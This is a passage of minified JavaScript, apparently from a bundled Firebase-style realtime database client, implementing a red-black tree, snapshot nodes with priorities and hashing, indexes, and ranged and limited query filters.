            null != e ? e : this.key,
            null != t ? t : this.value,
            null != n ? n : this.color,
            null != i ? i : this.left,
            null != r ? r : this.right
          );
        }
        count() {
          return this.left.count() + 1 + this.right.count();
        }
        isEmpty() {
          return !1;
        }
        inorderTraversal(e) {
          return (
            this.left.inorderTraversal(e) ||
            !!e(this.key, this.value) ||
            this.right.inorderTraversal(e)
          );
        }
        reverseTraversal(e) {
          return (
            this.right.reverseTraversal(e) ||
            e(this.key, this.value) ||
            this.left.reverseTraversal(e)
          );
        }
        min_() {
          return this.left.isEmpty() ? this : this.left.min_();
        }
        minKey() {
          return this.min_().key;
        }
        maxKey() {
          return this.right.isEmpty() ? this.key : this.right.maxKey();
        }
        insert(e, t, n) {
          let i = this,
            r = n(e, i.key);
          return (i =
            r < 0
              ? i.copy(null, null, null, i.left.insert(e, t, n), null)
              : 0 === r
              ? i.copy(null, t, null, null, null)
              : i.copy(
                  null,
                  null,
                  null,
                  null,
                  i.right.insert(e, t, n)
                )).fixUp_();
        }
        removeMin_() {
          if (this.left.isEmpty()) return eX.EMPTY_NODE;
          let e = this;
          return (
            e.left.isRed_() || e.left.left.isRed_() || (e = e.moveRedLeft_()),
            (e = e.copy(null, null, null, e.left.removeMin_(), null)).fixUp_()
          );
        }
        remove(e, t) {
          let n, i;
          if (((n = this), 0 > t(e, n.key)))
            n.left.isEmpty() ||
              n.left.isRed_() ||
              n.left.left.isRed_() ||
              (n = n.moveRedLeft_()),
              (n = n.copy(null, null, null, n.left.remove(e, t), null));
          else {
            if (
              (n.left.isRed_() && (n = n.rotateRight_()),
              n.right.isEmpty() ||
                n.right.isRed_() ||
                n.right.left.isRed_() ||
                (n = n.moveRedRight_()),
              0 === t(e, n.key))
            ) {
              if (n.right.isEmpty()) return eX.EMPTY_NODE;
              (i = n.right.min_()),
                (n = n.copy(i.key, i.value, null, null, n.right.removeMin_()));
            }
            n = n.copy(null, null, null, null, n.right.remove(e, t));
          }
          return n.fixUp_();
        }
        isRed_() {
          return this.color;
        }
        fixUp_() {
          let e = this;
          return (
            e.right.isRed_() && !e.left.isRed_() && (e = e.rotateLeft_()),
            e.left.isRed_() && e.left.left.isRed_() && (e = e.rotateRight_()),
            e.left.isRed_() && e.right.isRed_() && (e = e.colorFlip_()),
            e
          );
        }
        moveRedLeft_() {
          let e = this.colorFlip_();
          return (
            e.right.left.isRed_() &&
              (e = (e = (e = e.copy(
                null,
                null,
                null,
                null,
                e.right.rotateRight_()
              )).rotateLeft_()).colorFlip_()),
            e
          );
        }
        moveRedRight_() {
          let e = this.colorFlip_();
          return (
            e.left.left.isRed_() && (e = (e = e.rotateRight_()).colorFlip_()), e
          );
        }
        rotateLeft_() {
          let e = this.copy(null, null, eQ.RED, null, this.right.left);
          return this.right.copy(null, null, this.color, e, null);
        }
        rotateRight_() {
          let e = this.copy(null, null, eQ.RED, this.left.right, null);
          return this.left.copy(null, null, this.color, null, e);
        }
        colorFlip_() {
          let e = this.left.copy(null, null, !this.left.color, null, null),
            t = this.right.copy(null, null, !this.right.color, null, null);
          return this.copy(null, null, !this.color, e, t);
        }
        checkMaxDepth_() {
          let e = this.check_();
          return Math.pow(2, e) <= this.count() + 1;
        }
        check_() {
          if (this.isRed_() && this.left.isRed_())
            throw Error(
              "Red node has red child(" + this.key + "," + this.value + ")"
            );
          if (this.right.isRed_())
            throw Error(
              "Right child of (" + this.key + "," + this.value + ") is red"
            );
          let e = this.left.check_();
          if (e === this.right.check_()) return e + (this.isRed_() ? 0 : 1);
          throw Error("Black depths differ");
        }
      }
      (eQ.RED = !0), (eQ.BLACK = !1);
      class eX {
        constructor(e, t = eX.EMPTY_NODE) {
          (this.comparator_ = e), (this.root_ = t);
        }
        insert(e, t) {
          return new eX(
            this.comparator_,
            this.root_
              .insert(e, t, this.comparator_)
              .copy(null, null, eQ.BLACK, null, null)
          );
        }
        remove(e) {
          return new eX(
            this.comparator_,
            this.root_
              .remove(e, this.comparator_)
              .copy(null, null, eQ.BLACK, null, null)
          );
        }
        get(e) {
          let t,
            n = this.root_;
          for (; !n.isEmpty(); ) {
            if (0 === (t = this.comparator_(e, n.key))) return n.value;
            t < 0 ? (n = n.left) : t > 0 && (n = n.right);
          }
          return null;
        }
        getPredecessorKey(e) {
          let t,
            n = this.root_,
            i = null;
          for (; !n.isEmpty(); ) {
            if (0 === (t = this.comparator_(e, n.key))) {
              if (n.left.isEmpty()) return i ? i.key : null;
              for (n = n.left; !n.right.isEmpty(); ) n = n.right;
              return n.key;
            }
            t < 0 ? (n = n.left) : t > 0 && ((i = n), (n = n.right));
          }
          throw Error(
            "Attempted to find predecessor key for a nonexistent key.  What gives?"
          );
        }
        isEmpty() {
          return this.root_.isEmpty();
        }
        count() {
          return this.root_.count();
        }
        minKey() {
          return this.root_.minKey();
        }
        maxKey() {
          return this.root_.maxKey();
        }
        inorderTraversal(e) {
          return this.root_.inorderTraversal(e);
        }
        reverseTraversal(e) {
          return this.root_.reverseTraversal(e);
        }
        getIterator(e) {
          return new e$(this.root_, null, this.comparator_, !1, e);
        }
        getIteratorFrom(e, t) {
          return new e$(this.root_, e, this.comparator_, !1, t);
        }
        getReverseIteratorFrom(e, t) {
          return new e$(this.root_, e, this.comparator_, !0, t);
        }
        getReverseIterator(e) {
          return new e$(this.root_, null, this.comparator_, !0, e);
        }
      }
      function eJ(e, t) {
        return B(e.name, t.name);
      }
      function eZ(e, t) {
        return B(e, t);
      }
      eX.EMPTY_NODE = new (class {
        copy(e, t, n, i, r) {
          return this;
        }
        insert(e, t, n) {
          return new eQ(e, t, null);
        }
        remove(e, t) {
          return this;
        }
        count() {
          return 0;
        }
        isEmpty() {
          return !0;
        }
        inorderTraversal(e) {
          return !1;
        }
        reverseTraversal(e) {
          return !1;
        }
        minKey() {
          return null;
        }
        maxKey() {
          return null;
        }
        check_() {
          return 0;
        }
        isRed_() {
          return !1;
        }
      })();
      let e0 = function (e) {
          return "number" == typeof e ? "number:" + J(e) : "string:" + e;
        },
        e1 = function (e) {
          if (e.isLeafNode()) {
            let t = e.val();
            (0, y.hu)(
              "string" == typeof t ||
                "number" == typeof t ||
                ("object" == typeof t && (0, y.r3)(t, ".sv")),
              "Priority must be a string or number."
            );
          } else
            (0, y.hu)(e === r || e.isEmpty(), "priority of unexpected type.");
          (0, y.hu)(
            e === r || e.getPriority().isEmpty(),
            "Priority nodes can't have a priority of their own."
          );
        };
      class e3 {
        constructor(e, t = e3.__childrenNodeConstructor.EMPTY_NODE) {
          (this.value_ = e),
            (this.priorityNode_ = t),
            (this.lazyHash_ = null),
            (0, y.hu)(
              void 0 !== this.value_ && null !== this.value_,
              "LeafNode shouldn't be created with null/undefined value."
            ),
            e1(this.priorityNode_);
        }
        static set __childrenNodeConstructor(e) {
          s = e;
        }
        static get __childrenNodeConstructor() {
          return s;
        }
        isLeafNode() {
          return !0;
        }
        getPriority() {
          return this.priorityNode_;
        }
        updatePriority(e) {
          return new e3(this.value_, e);
        }
        getImmediateChild(e) {
          return ".priority" === e
            ? this.priorityNode_
            : e3.__childrenNodeConstructor.EMPTY_NODE;
        }
        getChild(e) {
          return eq(e)
            ? this
            : ".priority" === eP(e)
            ? this.priorityNode_
            : e3.__childrenNodeConstructor.EMPTY_NODE;
        }
        hasChild() {
          return !1;
        }
        getPredecessorChildName(e, t) {
          return null;
        }
        updateImmediateChild(e, t) {
          return ".priority" === e
            ? this.updatePriority(t)
            : t.isEmpty() && ".priority" !== e
            ? this
            : e3.__childrenNodeConstructor.EMPTY_NODE.updateImmediateChild(
                e,
                t
              ).updatePriority(this.priorityNode_);
        }
        updateChild(e, t) {
          let n = eP(e);
          return null === n
            ? t
            : t.isEmpty() && ".priority" !== n
            ? this
            : ((0, y.hu)(
                ".priority" !== n || 1 === ex(e),
                ".priority must be the last token in a path"
              ),
              this.updateImmediateChild(
                n,
                e3.__childrenNodeConstructor.EMPTY_NODE.updateChild(eR(e), t)
              ));
        }
        isEmpty() {
          return !1;
        }
        numChildren() {
          return 0;
        }
        forEachChild(e, t) {
          return !1;
        }
        val(e) {
          return e && !this.getPriority().isEmpty()
            ? {
                ".value": this.getValue(),
                ".priority": this.getPriority().val(),
              }
            : this.getValue();
        }
        hash() {
          if (null === this.lazyHash_) {
            let e = "";
            this.priorityNode_.isEmpty() ||
              (e += "priority:" + e0(this.priorityNode_.val()) + ":");
            let t = typeof this.value_;
            (e += t + ":"),
              (e += "number" === t ? J(this.value_) : this.value_),
              (this.lazyHash_ = R(e));
          }
          return this.lazyHash_;
        }
        getValue() {
          return this.value_;
        }
        compareTo(e) {
          return e === e3.__childrenNodeConstructor.EMPTY_NODE
            ? 1
            : e instanceof e3.__childrenNodeConstructor
            ? -1
            : ((0, y.hu)(e.isLeafNode(), "Unknown node type"),
              this.compareToLeafNode_(e));
        }
        compareToLeafNode_(e) {
          let t = typeof e.value_,
            n = typeof this.value_,
            i = e3.VALUE_TYPE_ORDER.indexOf(t),
            r = e3.VALUE_TYPE_ORDER.indexOf(n);
          return (
            (0, y.hu)(i >= 0, "Unknown leaf type: " + t),
            (0, y.hu)(r >= 0, "Unknown leaf type: " + n),
            i !== r
              ? r - i
              : "object" === n
              ? 0
              : this.value_ < e.value_
              ? -1
              : this.value_ === e.value_
              ? 0
              : 1
          );
        }
        withIndex() {
          return this;
        }
        isIndexed() {
          return !0;
        }
        equals(e) {
          return (
            e === this ||
            (!!e.isLeafNode() &&
              this.value_ === e.value_ &&
              this.priorityNode_.equals(e.priorityNode_))
          );
        }
      }
      e3.VALUE_TYPE_ORDER = ["object", "boolean", "number", "string"];
      let e2 = new (class extends eB {
          compare(e, t) {
            let n = e.node.getPriority(),
              i = t.node.getPriority(),
              r = n.compareTo(i);
            return 0 === r ? B(e.name, t.name) : r;
          }
          isDefinedOn(e) {
            return !e.getPriority().isEmpty();
          }
          indexedValueChanged(e, t) {
            return !e.getPriority().equals(t.getPriority());
          }
          minPost() {
            return ez.MIN;
          }
          maxPost() {
            return new ez(z, new e3("[PRIORITY-POST]", l));
          }
          makePost(e, t) {
            let n = o(e);
            return new ez(t, new e3("[PRIORITY-POST]", n));
          }
          toString() {
            return ".priority";
          }
        })(),
        e4 = Math.log(2);
      class e5 {
        constructor(e) {
          (this.count = parseInt(Math.log(e + 1) / e4, 10)),
            (this.current_ = this.count - 1);
          let t = parseInt(Array(this.count + 1).join("1"), 2);
          this.bits_ = (e + 1) & t;
        }
        nextBitIsOne() {
          let e = !(this.bits_ & (1 << this.current_));
          return this.current_--, e;
        }
      }
      let e6 = function (e, t, n, i) {
          e.sort(t);
          let r = function (t, i) {
              let s,
                o,
                l = i - t;
              if (0 === l) return null;
              if (1 === l)
                return (
                  (s = e[t]),
                  (o = n ? n(s) : s),
                  new eQ(o, s.node, eQ.BLACK, null, null)
                );
              {
                let a = parseInt(l / 2, 10) + t,
                  h = r(t, a),
                  u = r(a + 1, i);
                return (
                  (s = e[a]),
                  (o = n ? n(s) : s),
                  new eQ(o, s.node, eQ.BLACK, h, u)
                );
              }
            },
            o = (function (t) {
              let i = null,
                s = null,
                o = e.length,
                l = function (t, i) {
                  let s = o - t,
                    l = o;
                  o -= t;
                  let h = r(s + 1, l),
                    u = e[s],
                    c = n ? n(u) : u;
                  a(new eQ(c, u.node, i, null, h));
                },
                a = function (e) {
                  i ? ((i.left = e), (i = e)) : ((s = e), (i = e));
                };
              for (let h = 0; h < t.count; ++h) {
                let u = t.nextBitIsOne(),
                  c = Math.pow(2, t.count - (h + 1));
                u ? l(c, eQ.BLACK) : (l(c, eQ.BLACK), l(c, eQ.RED));
              }
              return s;
            })(new e5(e.length));
          return new eX(i || t, o);
        },
        e8 = {};
      class e7 {
        constructor(e, t) {
          (this.indexes_ = e), (this.indexSet_ = t);
        }
        static get Default() {
          return (
            (0, y.hu)(e8 && e2, "ChildrenNode.ts has not been loaded"),
            (a = a || new e7({ ".priority": e8 }, { ".priority": e2 }))
          );
        }
        get(e) {
          let t = (0, y.DV)(this.indexes_, e);
          if (!t) throw Error("No index defined for " + e);
          return t instanceof eX ? t : null;
        }
        hasIndex(e) {
          return (0, y.r3)(this.indexSet_, e.toString());
        }
        addIndex(e, t) {
          let n;
          (0, y.hu)(
            e !== eG,
            "KeyIndex always exists and isn't meant to be added to the IndexMap."
          );
          let i = [],
            r = !1,
            s = t.getIterator(ez.Wrap),
            o = s.getNext();
          for (; o; )
            (r = r || e.isDefinedOn(o.node)), i.push(o), (o = s.getNext());
          n = r ? e6(i, e.getCompare()) : e8;
          let l = e.toString(),
            a = Object.assign({}, this.indexSet_);
          a[l] = e;
          let h = Object.assign({}, this.indexes_);
          return (h[l] = n), new e7(h, a);
        }
        addToIndexes(e, t) {
          let n = (0, y.UI)(this.indexes_, (n, i) => {
            let r = (0, y.DV)(this.indexSet_, i);
            if (
              ((0, y.hu)(r, "Missing index implementation for " + i), n === e8)
            ) {
              if (!r.isDefinedOn(e.node)) return e8;
              {
                let s = [],
                  o = t.getIterator(ez.Wrap),
                  l = o.getNext();
                for (; l; ) l.name !== e.name && s.push(l), (l = o.getNext());
                return s.push(e), e6(s, r.getCompare());
              }
            }
            {
              let a = t.get(e.name),
                h = n;
              return (
                a && (h = h.remove(new ez(e.name, a))), h.insert(e, e.node)
              );
            }
          });
          return new e7(n, this.indexSet_);
        }
        removeFromIndexes(e, t) {
          let n = (0, y.UI)(this.indexes_, (n) => {
            if (n === e8) return n;
            {
              let i = t.get(e.name);
              return i ? n.remove(new ez(e.name, i)) : n;
            }
          });
          return new e7(n, this.indexSet_);
        }
      }
      class e9 {
        constructor(e, t, n) {
          (this.children_ = e),
            (this.priorityNode_ = t),
            (this.indexMap_ = n),
            (this.lazyHash_ = null),
            this.priorityNode_ && e1(this.priorityNode_),
            this.children_.isEmpty() &&
              (0, y.hu)(
                !this.priorityNode_ || this.priorityNode_.isEmpty(),
                "An empty node cannot have a priority"
              );
        }
        static get EMPTY_NODE() {
          return h || (h = new e9(new eX(eZ), null, e7.Default));
        }
        isLeafNode() {
          return !1;
        }
        getPriority() {
          return this.priorityNode_ || h;
        }
        updatePriority(e) {
          return this.children_.isEmpty()
            ? this
            : new e9(this.children_, e, this.indexMap_);
        }
        getImmediateChild(e) {
          if (".priority" === e) return this.getPriority();
          {
            let t = this.children_.get(e);
            return null === t ? h : t;
          }
        }
        getChild(e) {
          let t = eP(e);
          return null === t ? this : this.getImmediateChild(t).getChild(eR(e));
        }
        hasChild(e) {
          return null !== this.children_.get(e);
        }
        updateImmediateChild(e, t) {
          if (
            ((0, y.hu)(t, "We should always be passing snapshot nodes"),
            ".priority" === e)
          )
            return this.updatePriority(t);
          {
            let n,
              i,
              r = new ez(e, t);
            t.isEmpty()
              ? ((n = this.children_.remove(e)),
                (i = this.indexMap_.removeFromIndexes(r, this.children_)))
              : ((n = this.children_.insert(e, t)),
                (i = this.indexMap_.addToIndexes(r, this.children_)));
            let s = n.isEmpty() ? h : this.priorityNode_;
            return new e9(n, s, i);
          }
        }
        updateChild(e, t) {
          let n = eP(e);
          if (null === n) return t;
          {
            (0, y.hu)(
              ".priority" !== eP(e) || 1 === ex(e),
              ".priority must be the last token in a path"
            );
            let i = this.getImmediateChild(n).updateChild(eR(e), t);
            return this.updateImmediateChild(n, i);
          }
        }
        isEmpty() {
          return this.children_.isEmpty();
        }
        numChildren() {
          return this.children_.count();
        }
        val(e) {
          if (this.isEmpty()) return null;
          let t = {},
            n = 0,
            i = 0,
            r = !0;
          if (
            (this.forEachChild(e2, (s, o) => {
              (t[s] = o.val(e)),
                n++,
                r && e9.INTEGER_REGEXP_.test(s)
                  ? (i = Math.max(i, Number(s)))
                  : (r = !1);
            }),
            e || !r || !(i < 2 * n))
          )
            return (
              e &&
                !this.getPriority().isEmpty() &&
                (t[".priority"] = this.getPriority().val()),
              t
            );
          {
            let s = [];
            for (let o in t) s[o] = t[o];
            return s;
          }
        }
        hash() {
          if (null === this.lazyHash_) {
            let e = "";
            this.getPriority().isEmpty() ||
              (e += "priority:" + e0(this.getPriority().val()) + ":"),
              this.forEachChild(e2, (t, n) => {
                let i = n.hash();
                "" !== i && (e += ":" + t + ":" + i);
              }),
              (this.lazyHash_ = "" === e ? "" : R(e));
          }
          return this.lazyHash_;
        }
        getPredecessorChildName(e, t, n) {
          let i = this.resolveIndex_(n);
          if (!i) return this.children_.getPredecessorKey(e);
          {
            let r = i.getPredecessorKey(new ez(e, t));
            return r ? r.name : null;
          }
        }
        getFirstChildName(e) {
          let t = this.resolveIndex_(e);
          if (!t) return this.children_.minKey();
          {
            let n = t.minKey();
            return n && n.name;
          }
        }
        getFirstChild(e) {
          let t = this.getFirstChildName(e);
          return t ? new ez(t, this.children_.get(t)) : null;
        }
        getLastChildName(e) {
          let t = this.resolveIndex_(e);
          if (!t) return this.children_.maxKey();
          {
            let n = t.maxKey();
            return n && n.name;
          }
        }
        getLastChild(e) {
          let t = this.getLastChildName(e);
          return t ? new ez(t, this.children_.get(t)) : null;
        }
        forEachChild(e, t) {
          let n = this.resolveIndex_(e);
          return n
            ? n.inorderTraversal((e) => t(e.name, e.node))
            : this.children_.inorderTraversal(t);
        }
        getIterator(e) {
          return this.getIteratorFrom(e.minPost(), e);
        }
        getIteratorFrom(e, t) {
          let n = this.resolveIndex_(t);
          if (n) return n.getIteratorFrom(e, (e) => e);
          {
            let i = this.children_.getIteratorFrom(e.name, ez.Wrap),
              r = i.peek();
            for (; null != r && 0 > t.compare(r, e); )
              i.getNext(), (r = i.peek());
            return i;
          }
        }
        getReverseIterator(e) {
          return this.getReverseIteratorFrom(e.maxPost(), e);
        }
        getReverseIteratorFrom(e, t) {
          let n = this.resolveIndex_(t);
          if (n) return n.getReverseIteratorFrom(e, (e) => e);
          {
            let i = this.children_.getReverseIteratorFrom(e.name, ez.Wrap),
              r = i.peek();
            for (; null != r && t.compare(r, e) > 0; )
              i.getNext(), (r = i.peek());
            return i;
          }
        }
        compareTo(e) {
          return this.isEmpty()
            ? e.isEmpty()
              ? 0
              : -1
            : e.isLeafNode() || e.isEmpty()
            ? 1
            : e === te
            ? -1
            : 0;
        }
        withIndex(e) {
          if (e === eG || this.indexMap_.hasIndex(e)) return this;
          {
            let t = this.indexMap_.addIndex(e, this.children_);
            return new e9(this.children_, this.priorityNode_, t);
          }
        }
        isIndexed(e) {
          return e === eG || this.indexMap_.hasIndex(e);
        }
        equals(e) {
          if (e === this) return !0;
          if (
            e.isLeafNode() ||
            !this.getPriority().equals(e.getPriority()) ||
            this.children_.count() !== e.children_.count()
          )
            return !1;
          {
            let t = this.getIterator(e2),
              n = e.getIterator(e2),
              i = t.getNext(),
              r = n.getNext();
            for (; i && r; ) {
              if (i.name !== r.name || !i.node.equals(r.node)) return !1;
              (i = t.getNext()), (r = n.getNext());
            }
            return null === i && null === r;
          }
        }
        resolveIndex_(e) {
          return e === eG ? null : this.indexMap_.get(e.toString());
        }
      }
      e9.INTEGER_REGEXP_ = /^(0|[1-9]\d*)$/;
      let te = new (class extends e9 {
        constructor() {
          super(new eX(eZ), e9.EMPTY_NODE, e7.Default);
        }
        compareTo(e) {
          return e === this ? 0 : 1;
        }
        equals(e) {
          return e === this;
        }
        getPriority() {
          return this;
        }
        getImmediateChild(e) {
          return e9.EMPTY_NODE;
        }
        isEmpty() {
          return !1;
        }
      })();
      function tt(e, t = null) {
        if (null === e) return e9.EMPTY_NODE;
        if (
          ("object" == typeof e && ".priority" in e && (t = e[".priority"]),
          (0, y.hu)(
            null === t ||
              "string" == typeof t ||
              "number" == typeof t ||
              ("object" == typeof t && ".sv" in t),
            "Invalid priority type found: " + typeof t
          ),
          "object" == typeof e &&
            ".value" in e &&
            null !== e[".value"] &&
            (e = e[".value"]),
          "object" != typeof e || ".sv" in e)
        ) {
          return new e3(e, tt(t));
        }
        if (e instanceof Array) {
          let i = e9.EMPTY_NODE;
          return (
            X(e, (t, n) => {
              if ((0, y.r3)(e, t) && "." !== t.substring(0, 1)) {
                let r = tt(n);
                (r.isLeafNode() || !r.isEmpty()) &&
                  (i = i.updateImmediateChild(t, r));
              }
            }),
            i.updatePriority(tt(t))
          );
        }
        {
          let r = [],
            s = !1;
          if (
            (X(e, (e, t) => {
              if ("." !== e.substring(0, 1)) {
                let n = tt(t);
                n.isEmpty() ||
                  ((s = s || !n.getPriority().isEmpty()), r.push(new ez(e, n)));
              }
            }),
            0 === r.length)
          )
            return e9.EMPTY_NODE;
          let l = e6(r, eJ, (e) => e.name, eZ);
          if (!s) return new e9(l, tt(t), e7.Default);
          {
            let a = e6(r, e2.getCompare());
            return new e9(
              l,
              tt(t),
              new e7({ ".priority": a }, { ".priority": e2 })
            );
          }
        }
      }
      Object.defineProperties(ez, {
        MIN: { value: new ez(V, e9.EMPTY_NODE) },
        MAX: { value: new ez(z, te) },
      }),
        (eK.__EMPTY_NODE = e9.EMPTY_NODE),
        (e3.__childrenNodeConstructor = e9),
        (r = te),
        (l = te),
        (o = tt);
      class tn extends eB {
        constructor(e) {
          super(),
            (this.indexPath_ = e),
            (0, y.hu)(
              !eq(e) && ".priority" !== eP(e),
              "Can't create PathIndex with empty path or .priority key"
            );
        }
        extractChild(e) {
          return e.getChild(this.indexPath_);
        }
        isDefinedOn(e) {
          return !e.getChild(this.indexPath_).isEmpty();
        }
        compare(e, t) {
          let n = this.extractChild(e.node),
            i = this.extractChild(t.node),
            r = n.compareTo(i);
          return 0 === r ? B(e.name, t.name) : r;
        }
        makePost(e, t) {
          let n = tt(e),
            i = e9.EMPTY_NODE.updateChild(this.indexPath_, n);
          return new ez(t, i);
        }
        maxPost() {
          let e = e9.EMPTY_NODE.updateChild(this.indexPath_, te);
          return new ez(z, e);
        }
        toString() {
          return eM(this.indexPath_, 0).join("/");
        }
      }
      let ti = new (class extends eB {
        compare(e, t) {
          let n = e.node.compareTo(t.node);
          return 0 === n ? B(e.name, t.name) : n;
        }
        isDefinedOn(e) {
          return !0;
        }
        indexedValueChanged(e, t) {
          return !e.equals(t);
        }
        minPost() {
          return ez.MIN;
        }
        maxPost() {
          return ez.MAX;
        }
        makePost(e, t) {
          let n = tt(e);
          return new ez(t, n);
        }
        toString() {
          return ".value";
        }
      })();
      function tr(e) {
        return { type: "value", snapshotNode: e };
      }
      function ts(e, t) {
        return { type: "child_added", snapshotNode: t, childName: e };
      }
      function to(e, t) {
        return { type: "child_removed", snapshotNode: t, childName: e };
      }
      function tl(e, t, n) {
        return {
          type: "child_changed",
          snapshotNode: t,
          childName: e,
          oldSnap: n,
        };
      }
      class ta {
        constructor(e) {
          this.index_ = e;
        }
        updateChild(e, t, n, i, r, s) {
          (0, y.hu)(
            e.isIndexed(this.index_),
            "A node must be indexed if only a child is updated"
          );
          let o = e.getImmediateChild(t);
          return o.getChild(i).equals(n.getChild(i)) &&
            o.isEmpty() === n.isEmpty()
            ? e
            : (null != s &&
                (n.isEmpty()
                  ? e.hasChild(t)
                    ? s.trackChildChange(to(t, o))
                    : (0, y.hu)(
                        e.isLeafNode(),
                        "A child remove without an old child only makes sense on a leaf node"
                      )
                  : o.isEmpty()
                  ? s.trackChildChange(ts(t, n))
                  : s.trackChildChange(tl(t, n, o))),
              e.isLeafNode() && n.isEmpty()
                ? e
                : e.updateImmediateChild(t, n).withIndex(this.index_));
        }
        updateFullNode(e, t, n) {
          return (
            null == n ||
              (e.isLeafNode() ||
                e.forEachChild(e2, (e, i) => {
                  t.hasChild(e) || n.trackChildChange(to(e, i));
                }),
              t.isLeafNode() ||
                t.forEachChild(e2, (t, i) => {
                  if (e.hasChild(t)) {
                    let r = e.getImmediateChild(t);
                    r.equals(i) || n.trackChildChange(tl(t, i, r));
                  } else n.trackChildChange(ts(t, i));
                })),
            t.withIndex(this.index_)
          );
        }
        updatePriority(e, t) {
          return e.isEmpty() ? e9.EMPTY_NODE : e.updatePriority(t);
        }
        filtersNodes() {
          return !1;
        }
        getIndexedFilter() {
          return this;
        }
        getIndex() {
          return this.index_;
        }
      }
      class th {
        constructor(e) {
          (this.indexedFilter_ = new ta(e.getIndex())),
            (this.index_ = e.getIndex()),
            (this.startPost_ = th.getStartPost_(e)),
            (this.endPost_ = th.getEndPost_(e)),
            (this.startIsInclusive_ = !e.startAfterSet_),
            (this.endIsInclusive_ = !e.endBeforeSet_);
        }
        getStartPost() {
          return this.startPost_;
        }
        getEndPost() {
          return this.endPost_;
        }
        matches(e) {
          let t = this.startIsInclusive_
              ? 0 >= this.index_.compare(this.getStartPost(), e)
              : 0 > this.index_.compare(this.getStartPost(), e),
            n = this.endIsInclusive_
              ? 0 >= this.index_.compare(e, this.getEndPost())
              : 0 > this.index_.compare(e, this.getEndPost());
          return t && n;
        }
        updateChild(e, t, n, i, r, s) {
          return (
            this.matches(new ez(t, n)) || (n = e9.EMPTY_NODE),
            this.indexedFilter_.updateChild(e, t, n, i, r, s)
          );
        }
        updateFullNode(e, t, n) {
          t.isLeafNode() && (t = e9.EMPTY_NODE);
          let i = t.withIndex(this.index_);
          i = i.updatePriority(e9.EMPTY_NODE);
          let r = this;
          return (
            t.forEachChild(e2, (e, t) => {
              r.matches(new ez(e, t)) ||
                (i = i.updateImmediateChild(e, e9.EMPTY_NODE));
            }),
            this.indexedFilter_.updateFullNode(e, i, n)
          );
        }
        updatePriority(e, t) {
          return e;
        }
        filtersNodes() {
          return !0;
        }
        getIndexedFilter() {
          return this.indexedFilter_;
        }
        getIndex() {
          return this.index_;
        }
        static getStartPost_(e) {
          if (!e.hasStart()) return e.getIndex().minPost();
          {
            let t = e.getIndexStartName();
            return e.getIndex().makePost(e.getIndexStartValue(), t);
          }
        }
        static getEndPost_(e) {
          if (!e.hasEnd()) return e.getIndex().maxPost();
          {
            let t = e.getIndexEndName();
            return e.getIndex().makePost(e.getIndexEndValue(), t);
          }
        }
      }
      class tu {
        constructor(e) {
          (this.withinDirectionalStart = (e) =>
            this.reverse_ ? this.withinEndPost(e) : this.withinStartPost(e)),
            (this.withinDirectionalEnd = (e) =>
              this.reverse_ ? this.withinStartPost(e) : this.withinEndPost(e)),
            (this.withinStartPost = (e) => {
              let t = this.index_.compare(this.rangedFilter_.getStartPost(), e);
              return this.startIsInclusive_ ? t <= 0 : t < 0;
            }),
            (this.withinEndPost = (e) => {
              let t = this.index_.compare(e, this.rangedFilter_.getEndPost());
              return this.endIsInclusive_ ? t <= 0 : t < 0;
            }),
            (this.rangedFilter_ = new th(e)),
            (this.index_ = e.getIndex()),
            (this.limit_ = e.getLimit()),
            (this.reverse_ = !e.isViewFromLeft()),
            (this.startIsInclusive_ = !e.startAfterSet_),
            (this.endIsInclusive_ = !e.endBeforeSet_);
        }
        updateChild(e, t, n, i, r, s) {
          return (
            this.rangedFilter_.matches(new ez(t, n)) || (n = e9.EMPTY_NODE),
            e.getImmediateChild(t).equals(n)
              ? e
              : e.numChildren() < this.limit_
              ? this.rangedFilter_
                  .getIndexedFilter()
                  .updateChild(e, t, n, i, r, s)
              : this.fullLimitUpdateChild_(e, t, n, r, s)
          );
        }
        updateFullNode(e, t, n) {
          let i;
          if (t.isLeafNode() || t.isEmpty())
            i = e9.EMPTY_NODE.withIndex(this.index_);
          else if (
            2 * this.limit_ < t.numChildren() &&
            t.isIndexed(this.index_)
          ) {
            let r;
            (i = e9.EMPTY_NODE.withIndex(this.index_)),
              (r = this.reverse_
                ? t.getReverseIteratorFrom(
                    this.rangedFilter_.getEndPost(),
                    this.index_
                  )
                : t.getIteratorFrom(
                    this.rangedFilter_.getStartPost(),
                    this.index_
                  ));
            let s = 0;
            for (; r.hasNext() && s < this.limit_; ) {
              let o = r.getNext();
              if (this.withinDirectionalStart(o)) {
                if (!this.withinDirectionalEnd(o)) break;
                (i = i.updateImmediateChild(o.name, o.node)), s++;
              }
            }
          } else {
            let l;
            (i = (i = t.withIndex(this.index_)).updatePriority(e9.EMPTY_NODE)),
              (l = this.reverse_
                ? i.getReverseIterator(this.index_)
                : i.getIterator(this.index_));
            let a = 0;
            for (; l.hasNext(); ) {
              let h = l.getNext();
              a < this.limit_ &&
              this.withinDirectionalStart(h) &&
              this.withinDirectionalEnd(h)
                ? a++
                : (i = i.updateImmediateChild(h.name, e9.EMPTY_NODE));
            }
          }
          return this.rangedFilter_.getIndexedFilter().updateFullNode(e, i, n);
        }
        updatePriority(e, t) {
          return e;
        }
        filtersNodes() {
          return !0;
        }
        getIndexedFilter() {
          return this.rangedFilter_.getIndexedFilter();
        }
        getIndex() {
          return this.index_;
        }
        fullLimitUpdateChild_(e, t, n, i, r) {
          let s;
          if (this.reverse_) {
            let o = this.index_.getCompare();
            s = (e, t) => o(t, e);
          } else s = this.index_.getCompare();
          (0, y.hu)(e.numChildren() === this.limit_, "");
          let l = new ez(t, n),
            a = this.reverse_
              ? e.getFirstChild(this.index_)
              : e.getLastChild(this.index_),
            h = this.rangedFilter_.matches(l);
          if (e.hasChild(t)) {
            let u = e.getImmediateChild(t),
              c = i.getChildAfterChild(this.index_, a, this.reverse_);
            for (; null != c && (c.name === t || e.hasChild(c.name)); )
              c = i.getChildAfterChild(this.index_, c, this.reverse_);
            let d = null == c ? 1 : s(c, l);
            if (h && !n.isEmpty() && d >= 0)
              return (
                null != r && r.trackChildChange(tl(t, n, u)),
                e.updateImmediateChild(t, n)
              );
            {
              null != r && r.trackChildChange(to(t, u));
              let p = e.updateImmediateChild(t, e9.EMPTY_NODE);
              return null != c && this.rangedFilter_.matches(c)
                ? (null != r && r.trackChildChange(ts(c.name, c.node)),
                  p.updateImmediateChild(c.name, c.node))
                : p;
            }
          }
          return n.isEmpty()
            ? e
            : h && s(a, l) >= 0
            ? (null != r &&
                (r.trackChildChange(to(a.name, a.node)),
                r.trackChildChange(ts(t, n))),
              e
                .updateImmediateChild(t, n)
